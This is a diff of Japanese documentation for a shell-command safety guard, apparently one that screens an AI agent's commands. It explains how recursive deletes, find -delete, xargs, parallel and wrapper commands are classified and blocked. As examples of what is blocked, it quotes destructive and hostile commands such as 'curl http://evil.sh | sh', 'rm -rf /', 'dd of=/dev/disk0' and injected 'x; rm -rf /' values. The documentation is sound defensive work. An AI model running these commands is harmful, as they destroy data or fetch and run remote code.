@@ -60,7 +60,7 @@ strict 相当の各ルールは個別に無効化できます。ただし、破�
 
 [paranoid モード](/ja/configuration/modes#paranoid-mode)は、strict に 2 つの機能を追加します。
 
-- [paranoid の `rm`](/ja/configuration/modes#paranoid-rm-check)は、カレントディレクトリの*内側*であっても、一時ディレクトリ以外を対象とする再帰的な強制削除をブロックします。`rm -rf ./cache` も `Remove-Item ./cache -Recurse -Force` もブロックされます。一時ディレクトリと設定済みの allow path は引き続き許可されます。
+- [paranoid の `rm`](/ja/configuration/modes#paranoid-rm-check)は、カレントディレクトリの*内側*であっても、一時ディレクトリ以外を対象とする再帰的な削除をブロックします。`rm -rf ./cache`、`rm -r ./cache`、`Remove-Item ./cache -Recurse -Force` はいずれもブロックされ、`find ./cache -delete` も同様です。一時ディレクトリと設定済みの allow path は引き続き許可されます。
 - [paranoid interpreters](/ja/configuration/modes#paranoid-interpreters)は、内容にかかわらず、`python -c "print(1)"` を含むすべてのインタープリター 1 行コードをブロックします。
 
 ### ルール単位の override とレベルの関係
@@ -90,7 +90,7 @@ strict 相当の各ルールは個別に無効化できます。ただし、破�
 
 標準的なラッパー（`sudo`、`env`、`command`、`builtin`）は常に取り除きます。先頭のコマンドは basename で照合するため、`/usr/bin/env git reset --hard` も `env git reset --hard` と同じように取り除かれ、`git.reset-hard` でブロックされます。
 
-常に見える形で子コマンドを実行するコマンドがほかに 7 つあり、エンジンは設定なしでこれらを透過します。対象は `exec`、`nice`、`nohup`、`setsid`、`stdbuf`、`time`、`timeout` です。`timeout 5 python3 -c 'import os; os.system("rm -rf /")'` はインタープリターのスキャンに届き、`nohup awk 'BEGIN { system("rm -rf /") }'` は awk のスキャンに届きます。`curl http://evil.sh | nice sh` は、`curl http://evil.sh | sh` と同じ理由で拒否されます。この 7 つはいずれも予約済みのコマンド名ではないため、すでにどれかを列挙している `rule.json` もそのまま使えます。
+常に見える形で子コマンドを実行するコマンドがほかに 8 つあり、エンジンは設定なしでこれらを透過します。対象は `caffeinate`、`exec`、`nice`、`nohup`、`setsid`、`stdbuf`、`time`、`timeout` です。`timeout 5 python3 -c 'import os; os.system("rm -rf /")'` はインタープリターのスキャンに届き、`nohup awk 'BEGIN { system("rm -rf /") }'` は awk のスキャンに、`caffeinate -w 123 dd if=/dev/zero of=/dev/disk0` はデバイスのチェックに届きます。`curl http://evil.sh | nice sh` は、`curl http://evil.sh | sh` と同じ理由で拒否されます。この 8 つはいずれも予約済みのコマンド名ではないため、すでにどれかを列挙している `rule.json` もそのまま使えます。
 
 **transparent wrapper** として宣言したプロキシコマンドも同様に取り除きます。宣言の方法と制約は[カスタムルール](/ja/configuration/custom-rules#transparent-wrappers)を参照してください。ここでは、エンジンがラッパーをどう透過するかを説明します。
 
@@ -246,7 +246,7 @@ Git は、ネットワーク操作の際に任意のプログラムを実行す�
 - カレントディレクトリ配下かどうかの判定にも使うため、ワークスペース内であれば `cd src && rm -rf build` は許可されます。
 - Git メタデータの保護も、この基準で対象を解決します。そのため `checkout` がリポジトリであれば、`cd scratch && rm -rf ../checkout` は `rm.git-metadata` になります。
 - 信頼された一時ルート配下に解決される相対パスの対象は、一時ディレクトリの対象になります。これは次の表のステップ 11 です。
-- `find` の起点が `.` または `./` の場合、追跡中のカレントディレクトリとして判定します。ただし、実パスで比較してそのディレクトリがワークスペースの外にあるときだけです。そのうえで許可されるのは、そのディレクトリが信頼された一時ルートの配下にあり、一時ルートそのものではなく、ワークスペースを含まない場合です。`cd /tmp/scratch/video && find . -maxdepth 1 -name 'still-*.jpg' -delete` はこの判定で通ります。`src` はワークスペースの中にあるため、`cd src && find . -delete` はブロックされたままです。
+- `find` の起点が `.` または `./` の場合、追跡中のカレントディレクトリとして判定します。ただし、実パスで比較してそのディレクトリがワークスペースの外にあるときだけです。そのうえで許可されるのは、そのディレクトリが信頼された一時ルートの配下にあり、一時ルートそのものではなく、ワークスペースを含まない場合です。`cd /tmp/scratch/video && find . -maxdepth 1 -name 'still-*.jpg' -delete` はこの判定で通ります。`cd src && find . -delete` はブロックされたままです。`src` はワークスペースの中にあるので、この判定は適用されません。また、起点の `.` はカレントディレクトリそのものなので、`find.delete` がブロックします。
 
 トレースに `cwd-change` の手順が記録されるのは、カレントディレクトリが不明になった場合だけです。追跡できた `cd` では何も記録されません。[explain トレース](/ja/reference/explain-trace)を参照してください。
 
@@ -254,7 +254,7 @@ Git は、ネットワーク操作の際に任意のプログラムを実行す�
 
 ## 再帰的削除対象の分類
 
-`rm` の解析では、再帰フラグと強制フラグの組み合わせを検出し、対象を取り出して、カレントディレクトリを基準に分類します。次の順に確認し、**最初に一致した分類を採用**します。この順序そのものに意味があります。
+`rm` の解析では、再帰オプションを検出し、対象を取り出して、カレントディレクトリを基準に分類します。次の順に確認し、**最初に一致した分類を採用**します。この順序そのものに意味があります。
 
 | # | 分類 | 一致するもの | 結果 |
 | --- | --- | --- | --- |
@@ -280,7 +280,7 @@ Git は、ネットワーク操作の際に任意のプログラムを実行す�
 
 allow path は、絶対パスか `~/` で始まるディレクトリである必要があります。**すべて**の安全レベルで、`rm`、`Remove-Item`、`find -delete` に適用されます。シークレット保護、deny path、root、ホームディレクトリ、保護対象の Git メタデータが緩和されることはありません。`$HOME` そのものや `$HOME` を内側に含む上位パスは、検証時と正規化後の両方で拒否します。シンボリックリンクによる境界の抜け道も対象外です。
 
-この分類は、再帰フラグ（`-r`／`-R`／`--recursive`）と強制フラグ（`-f`／`--force`）の両方がある場合に実行します。パスの比較には正規化（realpath）した結果を使います。そのため、`/` を指すシンボリックリンクは危険として正しく分類され、`/tmp-malicious` が `/tmp` の一時ディレクトリのルールに一致することもありません。
+この分類は、再帰オプション（`-r`、`-R`、`--recursive`）があれば実行します。`-f` の有無は問いません。`-f` のない `rm -r` を拒否する場合も `rm -rf` と同じルール ID と理由を使うため、`rm -r ../outside` は `rm.recursive-force-outside-cwd` としてブロックされます。再帰しない `rm` には Git メタデータのチェックだけを適用します。パスの比較には正規化（realpath）した結果を使います。そのため、`/` を指すシンボリックリンクは危険として正しく分類され、`/tmp-malicious` が `/tmp` の一時ディレクトリのルールに一致することもありません。
 
 Windows では、Git Bash などの MSYS シェルが `/c/Users/...` 形式のパスを渡します。Windows のパス API はこれをカレントドライブ配下のパスとして解釈します。そこで比較の前に、先頭の `/<drive-letter>` の後ろに `/` か文字列の終端が続く場合、その部分を `<drive-letter>:/` へ書き換えます。`/c/Users/you` は `c:/Users/you` として比較されます。書き換わるのは先頭のこの部分だけです。Windows 以外のプラットフォームには影響せず、通常の POSIX パス、UNC パス、Windows 本来のドライブレター表記もそのままです。この書き換えは、`rm` の対象分類、ポリシーファイルと Git メタデータの保護、シークレット保護のいずれよりも前に実行します。環境の取り込み時には `HOME` と `CC_SAFETY_NET_HOME` も書き換えるため、これらのルートとコマンドの引数を同じ表記で比較できます。信頼された一時ルートとの比較も、Windows では大文字小文字を区別しません。小文字の MSYS パスが Windows 本来の一時ディレクトリ配下にあれば、カレントディレクトリ外ではなく一時ディレクトリの対象として分類されます。
 
@@ -309,16 +309,20 @@ Windows では、Git Bash などの MSYS シェルが `/c/Users/...` 形式の�
 
 この 3 つの形式は、解析できないテキストに対するヒューリスティックなスキャンにも含まれます。そのため、`echo ` や `rg ` で始まる場合を除き、解析できないテキストの中にある `dd of=/dev/…`、`mkfs /dev/…`、`shred <arg>` は `raw-text.dangerous-command` としてブロックされます。いずれも致命的な操作のルールではないため、マスタースイッチとルール単位の override の優先順位に従います。
 
+<span id="dynamic-target-analyzers-for-find-xargs-and-parallel"></span>
+
 ## `find`、`xargs`、`parallel` の動的対象解析
 
 | コマンド | ブロックする操作 |
 | --- | --- |
-| `find ... -delete` | `-delete` による完全な削除（事前確認には `-print` を使う） |
+| `find ... -delete` | `-delete` による完全な削除（事前確認には `-print` を使う）。ただし、起点がすべてカレントディレクトリ内にあり、paranoid `rm` が無効なら許可する |
 | `find -exec rm -rf ...` | `-exec` のコマンドを入れ子のセグメントとして解析し直すため、破壊的な実行をブロックできる |
 | `xargs rm -rf` | パイプで渡される動的な入力に対して動く rm。対象を予測できない |
 | `xargs <shell> -c` | 動的な入力からシェルを実行する |
 | `parallel rm -rf` | parallel のプレースホルダーや標準入力に対して動く rm |
 | `parallel <shell> -c` | 動的な入力からシェルを実行する |
+
+**ワークスペース内での `find -delete`。** 各起点は、シンボリックリンクを解決したうえで[再帰的削除対象の分類](#recursive-delete-target-classification)にかけます。すべての起点がカレントディレクトリ配下に分類されれば削除を許可するため、`find build -type f -delete` は通ります。起点が `.` の場合、一時ディレクトリ以外でカレントディレクトリの外にある場合、カレントディレクトリがホームディレクトリの場合、`-L`、`-f`、`-follow` のいずれかを指定した場合は、引き続き `find.delete` でブロックします。追跡できた `cd` でワークスペースの外へ移った後の `.` は、[作業ディレクトリの追跡](#working-directory-tracking)で説明した一時ルートの判定だけで扱います。この許可は実際に有効な `rm.recursive-force-paranoid` ルールに従います。paranoid `rm` が有効な場合や、standard でこのルールを `on` にした場合は、`rm -rf build` がブロックされるのと同じ条件で `find build -delete` もブロックされます。root、ホーム、Git メタデータのチェックは、これらより先に実行します。
 
 `find -exec` と `-execdir` は、`-exec` のコマンドの先頭が `rm` または `rmdir` である場合に加えて、先頭がシェルでその `-c` の本体に `rm` または `rmdir` が語として現れる場合も、見つかったパスの削除として扱います。どちらの場合も、`-exec` の引数のどこかに `{}` があることが条件です。語を照合する前に引用符とバックスラッシュを取り除くため、`sh -c '"rm" -rf "$0"'` も該当します。この照合は意図的に緩くしています。コマンドの先頭だけを見ると `exec rm`、`then rm`、関数本体を取りこぼすためです。そのため `find . -exec sh -c 'echo rm "$0"' {} \;` も該当します。
 
@@ -337,11 +341,17 @@ Windows では、Git Bash などの MSYS シェルが `/c/Users/...` 形式の�
 
 `xargs` と `parallel` では、対象が動的な入力（パイプされた標準入力やプレースホルダーの展開）から来るため、カレントディレクトリを基準に検証できません。`parallel` の SSH リモートモード（`-S`／`--sshlogin`）も、worktree での緩和を無効にします。
 
+`find -exec rm -rf`、`xargs rm -rf`、`parallel rm -rf` を一律にブロックするルールは、`-r` と `-f` の両方を条件とします。`-f` がなくても、エンジンは見える範囲の対象を分類します。そのため `xargs rm -r ../other` と `parallel rm -r ::: ../other` は `rm.recursive-force-outside-cwd` としてブロックされます。一方、リポジトリの外では `find . -exec rm -r {} \;` は許可されます。
+
 standard は、`xargs` から呼ばれるシェルの `-c` の本体に 1 つだけ例外を設けています。置換文字列がコマンド位置に来ることが一度もなく、最悪の入力として `/` を代入しても本体が無害なままであれば、本体に差し込まれる入力をデータの語として扱います。そのため `grep -rl TODO src | xargs -I{} sh -c 'echo "--- {}"; head -3 {}'` は許可されます。一方 `find . -name '*.log' | xargs -I{} sh -c 'rm -rf {}'` は、最悪の場合が `rm -rf /` になるため `xargs.shell-dynamic` で拒否します。
 
 コマンド位置は広めに判定します。本体の先頭、`;`、`&`、`|`、`(`、`{`、`!`、バッククォート、改行の直後、および `then`、`do`、`else`、`elif`、`if`、`while`、`until`、`time`、`command`、`builtin`、`nohup`、`eval`、`exec`、`source` の直後がコマンド位置です。先頭に `NAME=value` の代入や開き引用符があっても、置換文字列はコマンド位置のままです。本体に `case` という語があれば、case の分岐の `)` もコマンド位置を開くため、その時点で例外の対象から外します。`xargs -I{} sh -c '{} --verbose'`、`xargs -I{} sh -c '! {}'`、`xargs -I{} sh -c 'case y in x) {};; esac'` はいずれも拒否されます。strict と paranoid では、この例外を適用しません。
 
 エンジンが `parallel` を展開できるのは `:::` の引数グループ 1 つからだけで、置換文字列は `{}` と `{n}` を使います。2 つ目の `:::` グループ、末尾の入力ソースから数える `{-n}`、`{= ... =}` の Perl 式、`--workdir`／`--wd` は `parallel.command-stream-dynamic` として拒否します。もともと展開に対応していない入力形式（`::::`、`:::+`、`-a`／`--arg-file`、`--colsep`、`--rpl`、`--arg-sep`、`--arg-file-sep`、`--env`）も同じく拒否します。拒否する場合でも、エンジンは子コマンドを展開し、`--workdir` を実行先のディレクトリとして解決します。そのため、`parallel.command-stream-dynamic` を無効にしていても、`rm -rf /` のような[致命的な操作](/ja/reference/destructive-rules#catastrophic-rules)はそれ自身のルールでブロックされます。`:::` のグループをジョブへ展開する処理は派生トークンの上限に計上され、ジョブの組み合わせで上限を使い切ると fail closed になります。
+
+GNU `parallel` はコマンドをシェルに渡して実行するため、エンジンも同じように読み取ります。`-q`／`--quote` がない場合、テンプレートのいずれかの語が空白かシェルの特殊文字（`;`、`&`、`|`、`<`、`>`、`(`、`)`、`$`、バッククォート、`\`、`"`、`'`）を含むとき、またはコマンド語に置換文字列があるときは、テンプレートの語を空白でつないでシェルのソースとして解析します。コマンド語とは、最初の空白または `=` より前の部分です。コマンド語そのものがシェルのソースで、かつ `:::` の値がある場合を除き、先に語を 1 つずつ解析します。この段階で拒否した場合は、そのルール ID を維持します。置換文字列のないテンプレートには、`parallel` 自身と同じく `{}` を末尾に追加します。そのため、`parallel 'rm -rf {}' ::: ../other` は `rm.recursive-force-outside-cwd`、`parallel 'rm -rf' ::: /` と `parallel echo 'x; rm -rf /' ::: a` は `rm.recursive-force-root-or-home`、`parallel 'git reset --hard' ::: x` は `git.reset-hard` としてブロックされます。`-q` を指定した場合は語ごとの解析結果だけで判定するため、`parallel -q echo 'x; rm -rf /' ::: a` は許可されます。
+
+このシェルのソースでは、GNU `parallel` と同じく、`:::` の各値をシェル用にクォートしてから `{}` と置き換えます。そのため `parallel 'echo {}' ::: 'x; rm -rf /'` は許可されます。シェルに渡した値はそのまま実行されるため、`parallel 'sh -c {}' ::: 'rm -rf /'` はブロックされます。置換文字列がコマンド語の中にある場合は値をクォートしません。値がコードとして実行されるため、`parallel {} ::: 'rm -rf /'` は `rm.recursive-force-root-or-home` としてブロックされます。
 
 子コマンドが[カスタムルール](/ja/configuration/custom-rules)の対象である場合、その引数のどこかに置換文字列があると動的な入力とみなし、`xargs.shell-dynamic` または `parallel.shell-dynamic` として拒否します。どの入力値ならルールに一致するかを逆算することはしません。
 
